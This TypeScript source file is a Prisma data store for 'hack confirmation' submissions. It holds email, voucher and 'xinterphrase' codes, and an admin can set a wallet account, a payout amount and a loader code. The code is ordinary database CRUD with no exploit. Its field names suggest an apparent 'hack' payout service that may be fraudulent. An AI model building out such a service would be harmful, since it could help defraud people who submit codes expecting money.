/**
 * Hack Confirmation — Prisma/MySQL-backed store.
 */

import { prisma } from "@/lib/prisma";
import type { HackConfirmationEntry as PrismaConfirmationEntry } from "@prisma/client";

// ─── Public Types ─────────────────────────────────────────────────────────────

export type HackConfirmationEntry = {
  id: string;
  email: string;
  voucherCode: string;
  xinterphraseCode: string;
  submittedAt: string; // ISO string
  status: "pending" | "verified";
  confirmationHash: string | null;
  securityProtocol: string | null;
  remarks: string | null;
  percentageLevel: number | null;
  amountToReceive: number | null;
  walletAccount: string | null;
  loaderCode: string | null;
  securityLevel: number | null;
  verifiedAt: string | null;
  emailSent: boolean;
};

// ─── Helper ───────────────────────────────────────────────────────────────────

function toEntry(e: PrismaConfirmationEntry): HackConfirmationEntry {
  return {
    id: e.id,
    email: e.email,
    voucherCode: e.voucherCode,
    xinterphraseCode: e.xinterphraseCode,
    submittedAt: e.submittedAt.toISOString(),
    status: e.status as "pending" | "verified",
    confirmationHash: e.confirmationHash ?? null,
    securityProtocol: e.securityProtocol ?? null,
    remarks: e.remarks ?? null,
    percentageLevel: e.percentageLevel ?? null,
    amountToReceive: e.amountToReceive ?? null,
    walletAccount: e.walletAccount ?? null,
    loaderCode: e.loaderCode ?? null,
    securityLevel: e.securityLevel ?? null,
    verifiedAt: e.verifiedAt ? e.verifiedAt.toISOString() : null,
    emailSent: e.emailSent,
  };
}

// ─── Public Store Functions ───────────────────────────────────────────────────

/**
 * Upsert confirmation submission by email, voucherCode, and xinterphraseCode.
 * Returns { entry, isNew }.
 */
export async function upsertConfirmation(
  email: string,
  voucherCode: string,
  xinterphraseCode: string
): Promise<{ entry: HackConfirmationEntry; isNew: boolean }> {
  const cleanEmail = email.toLowerCase().trim();
  const cleanVoucher = voucherCode.trim();
  const cleanXinterphrase = xinterphraseCode.trim();

  // 1. Check if entry exists
  const existing = await prisma.hackConfirmationEntry.findFirst({
    where: {
      email: cleanEmail,
      voucherCode: cleanVoucher,
      xinterphraseCode: cleanXinterphrase,
    },
  });

  if (existing) {
    return { entry: toEntry(existing), isNew: false };
  }

  // 2. Create new entry
  try {
    const created = await prisma.hackConfirmationEntry.create({
      data: {
        email: cleanEmail,
        voucherCode: cleanVoucher,
        xinterphraseCode: cleanXinterphrase,
        status: "pending",
        notification: {
          create: { seenByAdmin: false },
        },
      },
    });

    return { entry: toEntry(created), isNew: true };
  } catch {
    // Handle concurrency race condition if another request created it simultaneously
    const refetched = await prisma.hackConfirmationEntry.findFirst({
      where: {
        email: cleanEmail,
        voucherCode: cleanVoucher,
        xinterphraseCode: cleanXinterphrase,
      },
    });

    if (refetched) {
      return { entry: toEntry(refetched), isNew: false };
    }

    throw new Error("Failed to register confirmation entry.");
  }
}

/**
 * Fetch confirmation entry by ID.
 */
export async function getConfirmationById(id: string): Promise<HackConfirmationEntry | null> {
  try {
    const found = await prisma.hackConfirmationEntry.findUnique({
      where: { id },
    });
    return found ? toEntry(found) : null;
  } catch {
    return null;
  }
}

/**
 * Check confirmation status by ID, email, voucherCode, and xinterphraseCode.
 */
export async function getConfirmationStatus(
  id: string,
  email: string,
  voucherCode: string,
  xinterphraseCode: string
): Promise<{ found: boolean; isVerified: boolean; entry?: HackConfirmationEntry }> {
  try {
    const cleanEmail = email.toLowerCase().trim();
    const cleanVoucher = voucherCode.trim();
    const cleanXinterphrase = xinterphraseCode.trim();

    let entry = await prisma.hackConfirmationEntry.findFirst({
      where: {
        id,
        email: cleanEmail,
        voucherCode: cleanVoucher,
        xinterphraseCode: cleanXinterphrase,
      },
    });

    if (!entry) {
      // Fallback lookup by credentials
      entry = await prisma.hackConfirmationEntry.findFirst({
        where: {
          email: cleanEmail,
          voucherCode: cleanVoucher,
          xinterphraseCode: cleanXinterphrase,
        },
      });
    }

    if (!entry) {
      return { found: false, isVerified: false };
    }

    return {
      found: true,
      isVerified: entry.status === "verified",
      entry: toEntry(entry),
    };
  } catch {
    return { found: false, isVerified: false };
  }
}

/**
 * Get all confirmation entries for admin dashboard.
 */
export async function getAllConfirmationEntries(): Promise<HackConfirmationEntry[]> {
  try {
    const records = await prisma.hackConfirmationEntry.findMany({
      orderBy: { submittedAt: "desc" },
    });
    return records.map(toEntry);
  } catch {
    return [];
  }
}

/**
 * Admin update confirmation entry.
 */
export async function adminUpdateConfirmationEntry(
  id: string,
  updates: {
    email?: string;
    voucherCode?: string;
    xinterphraseCode?: string;
    status: "pending" | "verified";
    confirmationHash?: string | null;
    securityProtocol?: string | null;
    remarks?: string | null;
    percentageLevel?: number | null;
    amountToReceive?: number | null;
    walletAccount?: string | null;
    loaderCode?: string | null;
    securityLevel?: number | null;
    emailSent?: boolean;
  }
): Promise<HackConfirmationEntry | null> {
  const data: Record<string, unknown> = {
    status: updates.status,
    confirmationHash: updates.confirmationHash ?? null,
    securityProtocol: updates.securityProtocol ?? null,
    remarks: updates.remarks ?? null,
    percentageLevel: updates.percentageLevel ?? null,
    amountToReceive: updates.amountToReceive ?? null,
    walletAccount: updates.walletAccount ?? null,
    loaderCode: updates.loaderCode ?? null,
    securityLevel: updates.securityLevel ?? null,
    ...(updates.emailSent !== undefined ? { emailSent: updates.emailSent } : {}),
  };

  if (updates.email) {
    data.email = updates.email.toLowerCase().trim();
  }
  if (updates.voucherCode) {
    data.voucherCode = updates.voucherCode.trim();
  }
  if (updates.xinterphraseCode) {
    data.xinterphraseCode = updates.xinterphraseCode.trim();
  }

  if (updates.status === "verified") {
    data.verifiedAt = new Date();
  } else {
    data.verifiedAt = null;
  }

  try {
    const updated = await prisma.hackConfirmationEntry.update({
      where: { id },
      data,
    });
    return toEntry(updated);
  } catch {
    return null;
  }
}

/**
 * Admin delete confirmation entry.
 */
export async function adminDeleteConfirmationEntry(id: string): Promise<boolean> {
  try {
    await prisma.hackConfirmationEntry.delete({
      where: { id },
    });
    return true;
  } catch {
    return false;
  }
}

/**
 * Get count of unread confirmation notifications.
 */
export async function getUnseenConfirmationCount(): Promise<number> {
  try {
    return await prisma.confirmationNotification.count({
      where: { seenByAdmin: false },
    });
  } catch {
    return 0;
  }
}

/**
 * Mark all confirmation notifications as seen.
 */
export async function markAllConfirmationNotificationsSeen(): Promise<void> {
  try {
    await prisma.confirmationNotification.updateMany({
      where: { seenByAdmin: false },
      data: { seenByAdmin: true },
    });
  } catch {
    // Non-critical, ignore
  }
}
